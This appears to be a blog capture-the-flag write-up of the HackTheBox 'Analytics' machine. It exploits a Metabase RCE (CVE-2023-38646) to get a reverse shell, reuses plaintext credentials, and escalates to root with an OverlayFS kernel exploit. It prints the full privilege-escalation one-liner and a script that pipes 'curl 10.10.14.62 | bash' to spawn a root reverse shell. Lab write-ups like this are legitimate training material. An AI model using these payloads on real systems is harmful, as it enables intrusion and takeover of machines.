---
layout: post
title: "Analytics"
date: 2026-02-22 10.00.00
categories: writeups
tags: [CVE enumeration, password hunting, kernel exploits]
lang: en
image: /assets/images/analytics/analytics-box.png
---

![]({{ "/assets/images/analytics/Pasted image 20260222122850.png" | relative_url }})

# Concepts seen on the machine
```
- CVE-2023-38646 unauth RCE
- Password hunting
- CVE-2023-2640 CVE-2023-32629 Kernel privesc
```

# Enumeration & Initial Foothold

>📍IP
>```
>10.10.11.233
>```

>🔐 Users:Passwords
```
metalytics:An4lytics_ds20223#
```

>🪪 Domains
```
analytical.htb
data.analytical.htb
```
## 🔎 nmap scanning

```python
nmap -p- -sS -Pn -n -vvv --min-rate 3000 -oG all-Ports 10.10.11.233
```

```
nmap --top-ports=300 -sU -vvv -oG UDP-Ports 10.10.11.233
```

```
nmap -p -sCV -vvv -oN Targeted 10.10.11.233
```

We run nmap to see which ports are open on the machine.

![]({{ "/assets/images/analytics/Pasted image 20241012133105.png" | relative_url }})

Ports 80 (HTTP) and 22 (SSH) are open. We run nmap again to see the version and service running on the open ports

![]({{ "/assets/images/analytics/Pasted image 20241012133115.png" | relative_url }})

As we can see, a redirect is being applied to the `analytical.htb` domain. We add it to /etc/hosts and launch whatweb to find out a little more about the website.

## 80 - HTTP

We launch the `whatweb` tool to see what technologies the website uses at first glance.
![]({{ "/assets/images/analytics/Pasted image 20241012133154.png" | relative_url }})

We access the website through the browser.
We see two emails, `demo@analytical.htb` and `due@analytical.htb`. The demo makes me think that there may be a subdomain somewhere with the dev. For now, let's access the website to see what we can do on it.

![]({{ "/assets/images/analytics/Pasted image 20241012133203.png" | relative_url }})

We note that there is one section that stands out from the rest: login.
We attempt to access the login section, but we see that a redirect to the domain `data.analytical.htb` is applied, so we add it to /etc/hosts and reload the page.

![]({{ "/assets/images/analytics/Pasted image 20241012133228.png" | relative_url }})

We see that Metabase is being used. While we investigate whether there is source code or anything else, we will first perform fuzzing on routes to the domain `analytical.htb` and then to `data.analytical.htb`. If we do not find anything, we will proceed to fuzz subdomains to see if there are any others besides data
![]({{ "/assets/images/analytics/Pasted image 20241012133239.png" | relative_url }})
![]({{ "/assets/images/analytics/Pasted image 20241012133248.png" | relative_url }})

We didn't find anything interesting from route fuzzing.
Searching for the tool on the internet, we found that it is an open-source tool with its source code on GitHub → [source code](https://github.com/metabase/metabase)

We download it and follow the steps to run the CVE
![]({{ "/assets/images/analytics/Pasted image 20241012133341.png" | relative_url }})

First, they tell us that we have to look for the setup-token value in the path /api/session/properties.

![]({{ "/assets/images/analytics/Pasted image 20241012133346.png" | relative_url }})

Now that we have it, let's run the exploit and listen on a port, since it's RCE.
We listen on port 443 and send a reverse shell, encoding the parameter with base64:

![]({{ "/assets/images/analytics/Pasted image 20241012133435.png" | relative_url }})

Now we run the exploit, we have to print the string, decode it and pipe it with bash, we listen on port 443:
![]({{ "/assets/images/analytics/Pasted image 20241012133453.png" | relative_url }})
![]({{ "/assets/images/analytics/Pasted image 20241012133457.png" | relative_url }})

We are "inside" the machine. I say “inside” in quotation marks because, upon checking the interfaces, we see that we are in a container, since the IP address is `172.17.0.2`.

![]({{ "/assets/images/analytics/Pasted image 20241012133504.png" | relative_url }})

Looking inside the container, in the metabase.db/ directory, we find what appear to be credentials:

![]({{ "/assets/images/analytics/Pasted image 20241012133551.png" | relative_url }})

We list the environment variables defined in the user, and note that there are credentials defined in plain text for the user `metalytics`.

![]({{ "/assets/images/analytics/Pasted image 20241012133600.png" | relative_url }})

We test the credentials via SSH and access the machine as the user metalytics.

![]({{ "/assets/images/analytics/Pasted image 20241012133611.png" | relative_url }})

Now that we are inside the actual machine, we can view the user flag.
![]({{ "/assets/images/analytics/Pasted image 20241012133632.png" | relative_url }})

# Privesc

We check if we can run something as root, but no luck.

![]({{ "/assets/images/analytics/Pasted image 20241012133750.png" | relative_url }})

We are looking for files that have SUID permissions, but there are none of interest.

![]({{ "/assets/images/analytics/Pasted image 20241012133756.png" | relative_url }})

We are going to upload the linpeas to see if there is any potential way to escalate privileges, but it does not report any privilege escalation methods. We continue listing and look at the internally open ports.

![]({{ "/assets/images/analytics/Pasted image 20241012133801.png" | relative_url }})

We launched pspy to see if any cron tasks or similar were running, but without success.

We looked for the kernel version and saw that it was out of date. While searching for the kernel version, we found an exploit for privilege escalation.

![]({{ "/assets/images/analytics/Pasted image 20241012133812.png" | relative_url }})

To verify that the kernel version is vulnerable, we try running an `id` command. The payload we use is as follows:
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'";rm -rf l u w m
```
![]({{ "/assets/images/analytics/Pasted image 20241012133828.png" | relative_url }})

We create an exploit to send ourselves a reverse shell.
To do this, we create an index.html file with the reverse shell payload and set up a server with Python on port 80. We will use curl and pipe with bash, we listen for connections on port 1443.

```
#!/bin/bash

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system(\"curl 10.10.14.62 | bash\")'";rm -rf l u w m
```
![]({{ "/assets/images/analytics/Pasted image 20241012134405.png" | relative_url }})

We have just escalated privileges on the machine, now we can see the root flag.
